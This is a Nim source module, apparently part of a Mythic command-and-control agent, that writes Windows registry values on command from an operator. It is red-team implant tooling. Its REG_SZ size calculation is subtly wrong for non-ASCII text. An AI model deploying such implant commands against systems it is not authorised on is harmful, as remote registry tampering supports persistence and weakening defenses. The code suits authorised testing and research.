## Registry Write Value - Write registry values

import std/[json, strformat, strutils]
import ../config
import ../utils/mythic_responses

when defined(windows):
  import winim/lean
  
  const
    KEY_SET_VALUE = 0x0002
    REG_SZ = 1
    REG_DWORD = 4
    ERROR_SUCCESS = 0
  
  proc RegOpenKeyExW(hKey: HKEY, lpSubKey: LPCWSTR, ulOptions: DWORD, 
                     samDesired: DWORD, phkResult: ptr HKEY): LONG 
    {.importc, dynlib: "advapi32.dll", stdcall.}
  
  proc RegSetValueExW(hKey: HKEY, lpValueName: LPCWSTR, Reserved: DWORD,
                      dwType: DWORD, lpData: ptr BYTE, cbData: DWORD): LONG 
    {.importc, dynlib: "advapi32.dll", stdcall.}
  
  proc RegCloseKey(hKey: HKEY): LONG 
    {.importc, dynlib: "advapi32.dll", stdcall.}
  
  proc getHiveHandle(hive: string): HKEY =
    ## Convert hive string to HKEY handle
    case hive.toUpperAscii()
    of "HKCR":
      return cast[HKEY](0x80000000'u32)  # HKEY_CLASSES_ROOT
    of "HKCU":
      return cast[HKEY](0x80000001'u32)  # HKEY_CURRENT_USER
    of "HKLM":
      return cast[HKEY](0x80000002'u32)  # HKEY_LOCAL_MACHINE
    of "HKU":
      return cast[HKEY](0x80000003'u32)  # HKEY_USERS
    of "HKCC":
      return cast[HKEY](0x80000005'u32)  # HKEY_CURRENT_CONFIG
    else:
      return cast[HKEY](0)

proc regWriteValue*(taskId: string, params: JsonNode): JsonNode =
  ## Write registry values
  let cfg = getConfig()
  
  when defined(windows):
    try:
      # Parse parameters
      let hive = params["hive"].getStr()
      let key = params["key"].getStr()
      let valueName = params["value_name"].getStr()
      let valueValue = params["value_value"].getStr()
      
      if cfg.debug:
        echo &"[DEBUG] reg_write_value: hive={hive}, key={key}, name={valueName}, value={valueValue}"
      
      let hiveHandle = getHiveHandle(hive)
      if hiveHandle == cast[HKEY](0):
        return mythicError(taskId, "Invalid hive specified")
      
      let keyNameW = newWideCString(key)
      let valueNameW = newWideCString(valueName)
      var keyHandle: HKEY = cast[HKEY](0)
      
      let status = RegOpenKeyExW(hiveHandle, keyNameW, 0, KEY_SET_VALUE, addr keyHandle)
      if status != ERROR_SUCCESS:
        return mythicError(taskId, &"Failed to open registry key: {status}")
      
      # Try to parse as DWORD, otherwise use string
      var setStatus: LONG
      try:
        let dwordVal = valueValue.parseUInt().uint32
        # Write as REG_DWORD
        if cfg.debug:
          echo &"[DEBUG] Writing as DWORD: {dwordVal}"
        
        setStatus = RegSetValueExW(
          keyHandle,
          valueNameW,
          0,
          REG_DWORD,
          cast[ptr BYTE](unsafeAddr dwordVal),
          DWORD(sizeof(uint32))
        )
      except:
        # Write as REG_SZ (string)
        if cfg.debug:
          echo &"[DEBUG] Writing as REG_SZ: {valueValue}"
        
        let valueDataW = newWideCString(valueValue)
        let dataSize = DWORD((valueValue.len + 1) * 2)  # +1 for null terminator, *2 for UTF-16
        
        setStatus = RegSetValueExW(
          keyHandle,
          valueNameW,
          0,
          REG_SZ,
          cast[ptr BYTE](unsafeAddr valueDataW[0]),
          dataSize
        )
      
      discard RegCloseKey(keyHandle)
      
      if setStatus == ERROR_SUCCESS:
        return mythicSuccess(taskId, &"Successfully set registry value: {valueName} = {valueValue}")
      else:
        return mythicError(taskId, &"Failed to set registry value: {setStatus}")
      
    except Exception as e:
      return mythicError(taskId, &"reg_write_value error: {e.msg}")
  else:
    return mythicError(taskId, "reg_write_value command is only available on Windows")
